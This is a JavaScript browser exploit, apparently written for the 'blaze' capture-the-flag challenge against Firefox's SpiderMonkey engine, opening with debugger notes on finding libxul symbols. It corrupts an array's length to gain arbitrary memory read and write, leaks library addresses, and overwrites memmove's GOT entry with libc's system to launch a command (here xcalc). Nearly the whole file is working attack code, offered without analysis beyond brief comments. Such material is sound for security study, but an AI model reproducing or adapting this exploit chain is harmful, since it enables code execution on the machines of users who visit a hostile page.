/*
how to find symbols for stuff in libxul
look for the function pointer you want using search in js process
find symbol name probably in date_static_method
then find the offset to that function in the symbol's struct
then go to firefox process and file fork mode parent
search for that symbol to get its address
inspect it with x/gx
then you will find function pointers to the static functions
these can get you the offset into the library as it is loaded
interesting symbol names foundL: js::date_now(JSContext*, unsigned int, JS::Value*)
_ZL19date_static_methods

*/
var ptr_overwrite_index = 0;

var conva = new ArrayBuffer(8);
var convf = new Float64Array(conva);
var convi = new Uint32Array(conva);
var convii = new Uint8Array(conva);
function print(msg) {
    console.log(msg);
//    document.body.innerText += msg + '\n';
}
function hex() {
	bottom_half = convi[0];
	top_half = convi[1];
	print(top_half.toString(16) + bottom_half.toString(16));
}
function print_ptrs(int2, int1) {
	print(int2.toString(16) + int1.toString(16))

}

print("---------Just so we know what length we are looking for-----------");
convf[0] = 0x515;
hex()
print("---------- This will be the first value we change--------------");
// Just a filler array so our type arrays get allocated after our blazer
var filler = new Array(100);
// The array we will call blaze on
var blazer = new Array(10);
//Make blazer a float array so we don't have to worry about the bit assertions
convf[0] = 0;
convi[1] = 0;
convi[0] = 0;
blazer.fill(convf[0]);
var len_change = new Uint32Array(0x1);
var bs_change = new Uint32Array(0x1);
bs_change[0] = 0x99999999
blazer.blaze();

// Find out length to modify
for(var i=0; i < 420; i++) {
	convf[0] = blazer[i];
	s = "With i at " + i + " we have the value:";
	print(s);
	hex();
	if(convi[1] == 0x3ff00000) {
		print("Got Equality");
		convi[0] = 0x44444444;
    		blazer[i] = convi[0];
		break
	}
}
// find out magic number 0x99999999
print("-------Finding our second array whose backing store pointer we will mess with---------");
for (var i=0; i < 100; i++) {
	convi[0] = len_change[i]
	convi[1] = len_change[i+1]
	hex()
	if(len_change[i] == 0x99999999) {
		print("Gotcha!");
		ptr_overwrite_index = i;
		convi[0] = len_change[i-2];
		convi[1] = len_change[i-1];
		hex();
		break;
	}
	
} 

function change_bstr(addr) {
	top_bits = Math.floor(addr / (2 ** 32));
	bottom_bits = addr % 0x100000000 
	len_change[ptr_overwrite_index - 1] = top_bits;
	len_change[ptr_overwrite_index - 2] = bottom_bits;
}

function read(addr) {
	if (addr instanceof Uint32Array) {
		addr = ( (addr[1] & 0x0000ffff) * (2 ** 32)) + addr[0]
	}
	print("-----READ-----")
	print("Addr: " + addr.toString(16)) 
	ret = new Uint32Array(2);
	change_bstr(addr);
	ret[0] = bs_change[0];
	change_bstr(addr + 4);
	ret[1] = bs_change[0];
	convi[0] = ret[0];
	convi[1] = ret[1];

	print("Data: " + convi[1].toString(16) + convi[0].toString(16))
	return ret;
}

function write(addr, valH, valL) {
	if (addr instanceof Uint32Array) {
		addr = ( (addr[1] & 0x0000ffff) * (2 ** 32)) + addr[0]
	}
	print("----WRITE----" )
	print("Addr: " + addr.toString(16))
	print("Value: " + valH.toString(16) + valL.toString(16))
	change_bstr(addr);
	bs_change[0] = valL;
	change_bstr(addr+4);
	bs_change[0] = valH;
}
function int64_subtract(buf, val) {
	var bufnew = new Uint32Array(2)
	bufnew[0] = buf[0]
	bufnew[1] = buf[1]
	bufnew[0] -= val & 0x00000000ffffffff
	bufnew[1] -= (val & 0x0000ffff00000000) >> 32
	return bufnew
}
function int64_add(buf, val) {
	var bufnew = new Uint32Array(2)
	bufnew[0] = buf[0]
	bufnew[1] = buf[1]
	bufnew[0] += val & 0x00000000ffffffff
	bufnew[1] += (val & 0x0000ffff00000000) >> 32
	return bufnew
}
// TODO leak got pointer
// call calc
/*
var jsxul_offset = 0x82afb0 - 0x400000 
var js_memmove_GOT_offset = 0x1e65098 - 0x400000
var libc_base = 0
var memmove_offset = 0x14d9b0
var system_offset = 0x45390
*/


var jsxul_offset = 0x49c7ab0
var js_memmove_GOT_offset = 0x818b220 
var libc_base = 0
var memmove_offset = 0x14d9b0
var system_offset = 0x45390



var cmd = "/usr/bin/xcalc &";
var target = new Uint8Array(100);


var bstr_val = new Uint32Array(2);
bs_change.fun = Date.now
bstr_val[0] = convi[0];
bstr_val[1] = convi[1];
var dtnow_obj_ptr = new Uint32Array(2)
dtnow_obj_ptr[0] = len_change[12]
dtnow_obj_ptr[1] = len_change[13]
var obj_ptr_leak = read(dtnow_obj_ptr)
// adjust pointer to be address ot Date.Now
obj_ptr_leak[0] += 0x28
var libxul_leak = read(obj_ptr_leak)
//get libxul_base
libxul_leak = int64_subtract(libxul_leak, jsxul_offset) 


memmove_leak = int64_add(libxul_leak, js_memmove_GOT_offset)
memmove_leak = read(memmove_leak)

print_ptrs(memmove_leak[1], memmove_leak[0])

libc_base =  int64_subtract(memmove_leak, memmove_offset)
system_leak = int64_add(libc_base, system_offset)
var memmove_GOT_addr = int64_add(libxul_leak, js_memmove_GOT_offset)
write(memmove_GOT_addr, system_leak[1], system_leak[0])

for (var i = 0; i < cmd.length; i++) {
	target[i] = cmd.charCodeAt(i);
}
target[cmd.length] = 0;
target.copyWithin(0, 1);  

var nun = readline();
